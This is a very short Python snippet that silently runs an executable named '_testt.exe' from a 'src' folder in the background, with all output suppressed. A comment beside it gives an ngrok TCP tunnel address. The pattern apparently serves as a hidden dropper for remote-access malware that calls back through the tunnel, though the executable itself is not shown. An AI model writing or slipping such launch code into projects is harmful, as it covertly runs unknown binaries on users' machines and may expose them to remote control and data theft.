import os
from threading import Thread
os.system("cd src && _testt.exe  > NUL 2>&1 &")
# tcp://0.tcp.in.ngrok.io:19373 